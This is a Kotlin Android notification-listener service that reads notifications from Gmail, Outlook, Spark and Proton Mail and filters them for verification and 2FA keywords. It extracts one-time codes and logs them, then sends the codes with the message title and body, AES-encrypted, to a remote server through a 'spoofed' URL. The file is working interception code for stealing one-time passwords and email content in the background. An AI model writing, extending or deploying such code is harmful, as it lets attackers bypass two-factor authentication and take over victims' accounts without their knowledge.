package com.gafam.relay

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.util.Base64

class EmailNotificationListener : NotificationListenerService() {

    companion object {
        private const val TAG = "GAFAM_EmailNotify"
        private const val GMAIL_PKG = "com.google.android.gm"
        private const val OUTLOOK_PKG = "com.microsoft.office.outlook"
        private const val SPARK_PKG = "com.readdle.spark"
        private const val PROTON_PKG = "ch.protonmail.android"

        // Email subject/keywords that indicate verification/OTP codes
        private val VERIFICATION_KEYWORDS = listOf(
            "code", "verify", "verification", "otp", "one-time", "password",
            "confirme", "confirmez", "valider", "validate", "validate",
            "security code", "login code", "sign in", "signin",
            "two-factor", "2fa", "auth code", "authentication",
            "activate", "activation", "confirm your", "confirmation"
        )
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName
        if (pkg != GMAIL_PKG && pkg != OUTLOOK_PKG && pkg != SPARK_PKG && pkg != PROTON_PKG) {
            return
        }

        val notification = sbn.notification
        val extras = notification.extras ?: return

        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getString(Notification.EXTRA_TEXT) ?: ""
        val subText = extras.getString(Notification.EXTRA_SUB_TEXT) ?: ""

        // Only process if it looks like a verification code email
        val combined = "$title $text $subText".lowercase()
        val isVerification = VERIFICATION_KEYWORDS.any { combined.contains(it) }
        if (!isVerification) return

        // Extract codes (4-8 digit numbers)
        val codes = extractOTPCodes(combined)
        if (codes.isEmpty()) return

        Log.i(TAG, "📧 Email OTP from $pkg: $codes")

        // Send to VPC
        sendToVpc(pkg, title, text, codes, sbn.postTime)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}

    private fun extractOTPCodes(text: String): List<String> {
        val patterns = listOf(
            Regex("""\b(\d{4,8})\b"""),
            Regex("""code[\s:]+(\d{4,8})"""),
            Regex("""verification[\s:]+(\d{4,8})"""),
            Regex("""OTP[\s:]+(\d{4,8})"""),
            Regex("""one[- ]time[\s:]+(\d{4,8})"""),
            Regex("""confirme[\s:]+(\d{4,8})"""),
            Regex("""confirmez[\s:]+(\d{4,8})""")
        )
        val codes = mutableListOf<String>()
        val seen = mutableSetOf<String>()
        for (pat in patterns) {
            for (match in pat.findAll(text)) {
                val code = match.groupValues.getOrNull(1) ?: match.value
                if (seen.add(code)) codes.add(code)
            }
        }
        return codes
    }

    private fun sendToVpc(pkg: String, title: String, text: String, codes: List<String>, postTime: Long) {
        val prefs = getSharedPreferences("GAFAM_PREFS", MODE_PRIVATE)
        val apiUrl = prefs.getString("apiUrl", null) ?: return
        val jwtSecret = prefs.getString("jwtSecret", null) ?: return

        thread {
            try {
                val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/auth/email/notif")
                val client = ApiClient.getClient(applicationContext) ?: return@thread

                val jsonBody = JSONObject().apply {
                    put("app", pkg)
                    put("title", title)
                    put("body", text)
                    put("codes", JSONObject.wrap(codes))
                    put("timestamp", postTime)
                }

                val plaintext = jsonBody.toString().toByteArray(Charsets.UTF_8)
                val digest = MessageDigest.getInstance("SHA-256")
                val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
                val secretKey = SecretKeySpec(keyBytes, "AES")

                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
                val iv = ByteArray(12)
                SecureRandom().nextBytes(iv)
                val gcmSpec = GCMParameterSpec(128, iv)
                cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmSpec)
                val ciphertext = cipher.doFinal(plaintext)

                val encryptedPayload = JSONObject().apply {
                    put("encrypted_data", Base64.encodeToString(ciphertext, Base64.NO_WRAP))
                    put("iv", Base64.encodeToString(iv, Base64.NO_WRAP))
                }

                val body = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
                val request = Request.Builder()
                    .url(spoofedUrl)
                    .post(body)
                    .addHeader("Authorization", "Bearer $jwtSecret")
                    .build()

                val response = client.newCall(request).execute()
                Log.d(TAG, "VPC email notif response: ${response.code}")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send email notif to VPC", e)
            }
        }
    }
}
